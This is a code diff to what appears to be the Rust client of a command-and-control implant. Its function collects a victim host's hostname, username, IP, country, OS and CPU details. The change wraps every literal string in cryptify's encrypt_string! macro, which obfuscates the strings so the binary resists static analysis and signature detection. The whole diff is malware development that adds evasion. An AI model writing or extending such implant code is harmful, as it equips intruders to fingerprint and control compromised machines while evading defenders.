@@ -1,3 +1,4 @@
+use cryptify::encrypt_string;
 use common::error::{C2Error, C2Result};
 use common::message::ClientInfo;
 use common::sysinfo::{get_country, get_hardware_info, get_hostname, get_local_ip};
@@ -12,7 +13,7 @@ pub async fn build_client_info(client_id_opt: Option<String>) -> C2Result<Client
         .map_err(|e| C2Error::Other(format!("Failed to parse hardware info: {e}")))?;
 
     let ip = get_local_ip()
-        .unwrap_or_else(|_| "127.0.0.1".parse().unwrap())
+        .unwrap_or_else(|_| encrypt_string!("127.0.0.1").parse().unwrap())
         .to_string();
 
     let country_info = tokio::task::spawn_blocking({
@@ -28,10 +29,10 @@ pub async fn build_client_info(client_id_opt: Option<String>) -> C2Result<Client
 
     Ok(ClientInfo {
         id: client_id,
-        hostname: get_hostname().unwrap_or_else(|_| "unknown".to_string()),
+        hostname: get_hostname().unwrap_or_else(|_| encrypt_string!("unknown").to_string()),
         username: std::env::var("USER")
             .or_else(|_| std::env::var("USERNAME"))
-            .unwrap_or_else(|_| "unknown".to_string()),
+            .unwrap_or_else(|_| encrypt_string!("unknown").to_string()),
         os: std::env::consts::OS.to_string(),
         arch: std::env::consts::ARCH.to_string(),
         ip,
@@ -39,7 +40,7 @@ pub async fn build_client_info(client_id_opt: Option<String>) -> C2Result<Client
         cpu_brand: hardware_info
             .get("cpu_brand")
             .and_then(|v| v.as_str())
-            .unwrap_or("unknown")
+            .unwrap_or(encrypt_string!("unknown").as_str())
             .to_string(),
         cpu_frequency: hardware_info
             .get("cpu_frequency_MHz")
